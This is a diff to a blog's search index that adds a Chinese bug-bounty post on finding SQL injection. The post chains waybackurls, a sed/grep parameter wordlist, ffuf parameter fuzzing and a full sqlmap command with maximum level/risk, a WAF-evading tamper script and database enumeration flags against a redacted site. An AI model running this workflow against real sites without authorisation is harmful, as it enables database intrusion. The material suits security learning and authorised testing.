@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>如何快速挖掘sql注入漏洞</title>
+      <link href="/2022/10/24/dig_sql/"/>
+      <url>/2022/10/24/dig_sql/</url>
+      
+        <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p>在一个平台上看到国外小哥的一篇文章，如何快速挖到sql注入漏洞：<a href="https://0xmahmoudjo0.medium.com/how-i-found-multiple-sql-injection-with-ffuf-and-sqlmap-in-a-few-minutes-9c3bb3780e8f%EF%BC%8C%E5%AD%A6%E4%B9%A0%E4%B8%80%E4%B8%8B%E6%80%9D%E8%B7%AF">https://0xmahmoudjo0.medium.com/how-i-found-multiple-sql-injection-with-ffuf-and-sqlmap-in-a-few-minutes-9c3bb3780e8f，学习一下思路</a></p><h3 id="0x01-思路">0x01 思路</h3><p>第一步，使用waybackurls工具爬去网页的所有链接，可以添加筛选的条件，uro是一个删除重复网址的工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">waybackurls https://redacted.org/ | uro | grep “.php” &gt; php-files.txt</span><br></pre></td></tr></table></figure><p>第二步，发现PHP文件名看起来很有趣，由get开头，尝试制作参数字典，进行一系列的处理</p><img src="/2022/10/24/dig_sql/image-20221024163646131.png" alt="image-20221024163646131" style="zoom:50%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat php-files.txt| grep -i get | sed ‘s/.*.get//’ | sort -u</span><br></pre></td></tr></table></figure><p>只需要 grep 包含<em>get</em>字符串的行并删除它之前的所有行并使其唯一以避免重复</p><img src="/2022/10/24/dig_sql/image-20221024163401237.png" alt="image-20221024163401237" style="zoom:50%;"><p>但我们应该删除 .php 字符串来创建一个列表，所以我只是将这一行添加到最后一个命令cut -f1 -d”.”</p><img src="/2022/10/24/dig_sql/image-20221024163551787.png" alt="image-20221024163551787" style="zoom:50%;"><p>我注意到我所有的字符串都包含两个单词，我不知道它们中的哪个是参数，所以让我们拆分它</p><p>如何在一行中找到大写字母，并拆分成行    sed ‘s/[AZ]+/\n&amp;/g’</p><img src="/2022/10/24/dig_sql/image-20221024163949891.png" alt="image-20221024163949891" style="zoom:50%;"><p>认为大多数参数都是小写的，而不是大写的，所以我将其保留为大写参数并将其转换为小写</p><img src="/2022/10/24/dig_sql/image-20221024164005355.png" alt="image-20221024164005355" style="zoom:50%;"><p>第三步，使用ffuf去fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w lowercase-parameters.txt -u &quot;https://redacted.org/searchProgressCommitment.php?FUZZ=5&quot;</span><br></pre></td></tr></table></figure><p>get 请求没结果，尝试转换post请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w lowercase-parameters.txt -X POST -d &quot;FUZZ=5&quot; -u &quot;https://redacted.org/searchProgressCommitment.php&quot;</span><br></pre></td></tr></table></figure><p>第四步，使用sqlmap去跑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r req3.txt -p commitment --force-ssl --level 5 --risk 3 --dbms=”MYSQL” --hostname --current-user --current-db --dbs --tamper=between --no-cast</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--level 5 --&gt; Level of tests to perform.</span><br><span class="line">--risk 3 --&gt; Risk of tests to perform</span><br><span class="line">--dbms --&gt; back-end DBMS value</span><br><span class="line">--no-cast --&gt; to avoid use cast-alike statements during data fetching</span><br><span class="line">--tamper --&gt; to evade filters and WAF’s</span><br><span class="line">&quot;--hostname --current-user --current-db --dbs&quot; --&gt; to retrieve info about the database</span><br></pre></td></tr></table></figure><img src="/2022/10/24/dig_sql/image-20221024164202234.png" alt="image-20221024164202234" style="zoom:50%;">]]></content>
+      
+      
+      <categories>
+          
+          <category> 赏金 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Sql注入 </tag>
+            
+            <tag> ffuf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>关于文件上传的一些总结</title>
       <link href="/2022/10/21/fileupload/"/>
       <url>/2022/10/21/fileupload/</url>
